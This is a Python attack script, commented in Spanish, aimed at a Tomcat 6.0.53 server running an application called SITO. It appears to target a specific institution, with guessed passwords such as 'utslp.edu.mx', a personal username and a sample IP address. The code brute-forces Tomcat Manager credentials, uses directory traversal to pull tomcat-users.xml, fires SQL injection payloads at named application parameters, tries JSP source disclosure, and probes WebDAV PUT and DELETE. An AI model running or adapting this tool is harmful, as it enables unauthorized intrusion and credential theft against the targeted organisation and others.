import requests
import threading
import queue
import base64
import sys
from urllib.parse import urljoin

class TomcatExplorer:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (compatible; TomcatScanner/1.0)'
        })
        self.found_paths = []
        self.credentials_queue = queue.Queue()
        
    def test_connection(self):
        """Test basic connectivity"""
        try:
            r = self.session.get(self.target, timeout=10, verify=False)
            return r.status_code == 200
        except:
            return False

    def port_scanner(self):
        """Escanear puertos comunes de Tomcat"""
        common_ports = [80, 443, 8080, 8009, 8005, 8443, 8081, 8090]
        open_ports = []
        
        for port in common_ports:
            try:
                if port == 443:
                    url = f"https://{self.target.split('://')[1].split('/')[0]}:{port}"
                else:
                    url = f"http://{self.target.split('://')[1].split('/')[0]}:{port}"
                
                r = self.session.get(url, timeout=5, verify=False)
                if r.status_code != 404:
                    open_ports.append((port, r.headers.get('Server', 'Unknown')))
            except:
                continue
                
        return open_ports

    def discover_tomcat_paths(self):
        """Descubrir rutas comunes de Tomcat"""
        paths = [
            # Rutas de administración
            '/manager/html', '/manager/status', '/manager/jmxproxy',
            '/host-manager/html', '/admin', '/webdav',
            
            # Rutas de documentación y ejemplos
            '/docs/', '/examples/', 
            '/examples/servlets/', '/examples/jsp/',
            
            # Archivos de configuración
            '/conf/tomcat-users.xml', '/conf/server.xml',
            '/webapps/manager/WEB-INF/web.xml',
            '/WEB-INF/web.xml', '/META-INF/context.xml',
            
            # Rutas de la aplicación SITO
            '/jsp/', '/jsp/index.jsp', '/jsp/admin/',
            '/jsp/escolar/', '/jsp/escolar/proceso_admision/',
            '/styles/', '/images/', '/javascript/'
        ]
        
        found = []
        for path in paths:
            try:
                url = urljoin(self.target, path)
                r = self.session.get(url, timeout=5, verify=False)
                
                if r.status_code == 200:
                    found.append((path, '200 OK'))
                    print(f"[+] Found: {path} - 200 OK")
                elif r.status_code == 403:
                    found.append((path, '403 Forbidden'))
                    print(f"[!] Protected: {path} - 403 Forbidden")
                elif r.status_code == 401:
                    found.append((path, '401 Unauthorized'))
                    print(f"[!] Auth Required: {path} - 401 Unauthorized")
                    
            except Exception as e:
                continue
                
        return found

    def brute_force_manager(self):
        """Fuerza bruta contra Tomcat Manager"""
        users = ['admin', 'tomcat', 'manager', 'root', 'both', 'role1', 'hnieto']
        passwords = [
            'admin', 'tomcat', 'manager', '', 'password', '123456',
            'tomcat6', 'tomcat6.0', 'admin123', 'tomcat123',
            'utslp', 'utslp.edu.mx', 'sito', 'misitio'
        ]
        
        for user in users:
            for password in passwords:
                self.credentials_queue.put((user, password))
        
        # Probar credenciales
        results = []
        while not self.credentials_queue.empty():
            user, password = self.credentials_queue.get()
            try:
                url = urljoin(self.target, '/manager/html')
                r = self.session.get(url, auth=(user, password), timeout=5, verify=False)
                
                if r.status_code == 200 and 'Tomcat Web Application Manager' in r.text:
                    results.append((user, password, 'SUCCESS'))
                    print(f"[CRITICAL] Valid credentials found: {user}:{password}")
                    break
                elif r.status_code == 401:
                    print(f"[-] Failed: {user}:{password}")
                    
            except Exception as e:
                continue
                
        return results

    def extract_tomcat_users(self):
        """Intentar extraer tomcat-users.xml"""
        methods = [
            # Método directo
            '/conf/tomcat-users.xml',
            # Directory traversal
            '/examples/jsp/include/include.jsp?page=../../../../conf/tomcat-users.xml',
            '/examples/jsp/cal/cal2.jsp?time=../../../../conf/tomcat-users.xml',
            # WebDAV
            '/webdav/conf/tomcat-users.xml'
        ]
        
        for method in methods:
            try:
                url = urljoin(self.target, method)
                r = self.session.get(url, timeout=5, verify=False)
                
                if 'tomcat-users' in r.text and 'password' in r.text:
                    print(f"[CRITICAL] tomcat-users.xml found via: {method}")
                    return r.text
                    
            except Exception as e:
                continue
                
        return None

    def sql_injection_scan(self):
        """Escaneo de SQL Injection en parámetros encontrados"""
        injection_points = [
            '/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=',
            '/jsp/index.jsp?yUsuario=',
            '/jsp/login.jsp?xUsuario='
        ]
        
        payloads = [
            "1' OR '1'='1'--",
            "1' UNION SELECT 1,2,3--", 
            "1' AND 1=1--",
            "admin'--"
        ]
        
        results = []
        for point in injection_points:
            for payload in payloads:
                try:
                    url = urljoin(self.target, point + payload)
                    r = self.session.get(url, timeout=5, verify=False)
                    
                    if 'error' not in r.text.lower() and r.status_code == 200:
                        if 'solicita ficha' not in r.text.lower():
                            results.append((point, payload, 'POSSIBLE'))
                            print(f"[!] Possible SQLi: {point}{payload}")
                            
                except Exception as e:
                    continue
                    
        return results

    def jsp_source_disclosure(self):
        """Intentar descubrir código fuente JSP"""
        jsp_files = [
            '/index.jsp', '/jsp/index.jsp', '/login.jsp',
            '/admin/login.jsp', '/examples/jsp/snp/snoop.jsp'
        ]
        
        methods = [
            '.jsp%20',
            '.jsp%00',
            '.jsp%20.bak',
            '.jsp~',
            '/WEB-INF/web.xml'
        ]
        
        for jsp in jsp_files:
            for method in methods:
                try:
                    url = urljoin(self.target, jsp + method)
                    r = self.session.get(url, timeout=5, verify=False)
                    
                    if '<%' in r.text or 'jsp:' in r.text or 'page import' in r.text:
                        print(f"[CRITICAL] JSP source disclosed: {url}")
                        return r.text
                        
                except Exception as e:
                    continue
                    
        return None

    def scan_webdav(self):
        """Verificar funcionalidad WebDAV"""
        methods = ['OPTIONS', 'PUT', 'DELETE', 'PROPFIND']
        webdav_capabilities = []
        
        for method in methods:
            try:
                r = self.session.request(method, self.target, timeout=5, verify=False)
                if r.status_code != 405 and r.status_code != 501:
                    webdav_capabilities.append((method, r.status_code))
                    print(f"[!] WebDAV {method} allowed: {r.status_code}")
            except:
                continue
                
        return webdav_capabilities

    def comprehensive_scan(self):
        """Escaneo completo"""
        print("=== TOMCAT 6.0.53 COMPREHENSIVE SCANNER ===")
        print(f"Target: {self.target}")
        print()
        
        # 1. Test connection
        print("[1] Testing connection...")
        if not self.test_connection():
            print("[-] Cannot connect to target")
            return
            
        print("[+] Connection successful")
        print()
        
        # 2. Port scanning
        print("[2] Scanning ports...")
        ports = self.port_scanner()
        for port, server in ports:
            print(f"[+] Port {port} open - Server: {server}")
        print()
        
        # 3. Path discovery
        print("[3] Discovering paths...")
        paths = self.discover_tomcat_paths()
        print()
        
        # 4. Tomcat users extraction
        print("[4] Attempting to extract tomcat-users.xml...")
        users_xml = self.extract_tomcat_users()
        if users_xml:
            print("[SUCCESS] tomcat-users.xml content:")
            print(users_xml[:1000] + "..." if len(users_xml) > 1000 else users_xml)
        print()
        
        # 5. Manager brute force
        print("[5] Brute forcing Tomcat Manager...")
        credentials = self.brute_force_manager()
        print()
        
        # 6. SQL Injection scan
        print("[6] Scanning for SQL Injection...")
        sqli_results = self.sql_injection_scan()
        print()
        
        # 7. JSP source disclosure
        print("[7] Testing for JSP source disclosure...")
        jsp_source = self.jsp_source_disclosure()
        print()
        
        # 8. WebDAV scan
        print("[8] Checking WebDAV capabilities...")
        webdav = self.scan_webdav()
        print()
        
        # Generate report
        self.generate_report(ports, paths, credentials, sqli_results, webdav)

    def generate_report(self, ports, paths, credentials, sqli_results, webdav):
        """Generar reporte completo"""
        print("\n" + "="*60)
        print("SCAN REPORT")
        print("="*60)
        
        print(f"\nTarget: {self.target}")
        print(f"Open ports: {[port[0] for port in ports]}")
        
        print("\n[CRITICAL FINDINGS]")
        if credentials:
            for user, pwd, status in credentials:
                print(f"✓ MANAGER ACCESS: {user}:{pwd}")
        
        # Mostrar rutas interesantes
        print("\n[INTERESTING PATHS]")
        for path, status in paths:
            if any(x in path for x in ['manager', 'admin', 'conf', 'web.xml']):
                print(f"{path} - {status}")
        
        print("\n[SECURITY ASSESSMENT]")
        print("Vulnerabilities found:")
        if sqli_results:
            print("✓ SQL Injection vulnerabilities")
        if webdav:
            print("✓ WebDAV enabled (potential upload vulnerability)")
        if any('examples' in path[0] for path in paths):
            print("✓ Examples directory accessible (CRITICAL)")
        if any('docs' in path[0] for path in paths):
            print("✓ Documentation directory accessible")

if __name__ == "__main__":
    # Desactivar warnings de SSL
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    if len(sys.argv) != 2:
        print("Usage: python tomcat_scanner.py <target_url>")
        print("Example: python tomcat_scanner.py http://189.254.143.102")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = TomcatExplorer(target)
    scanner.comprehensive_scan()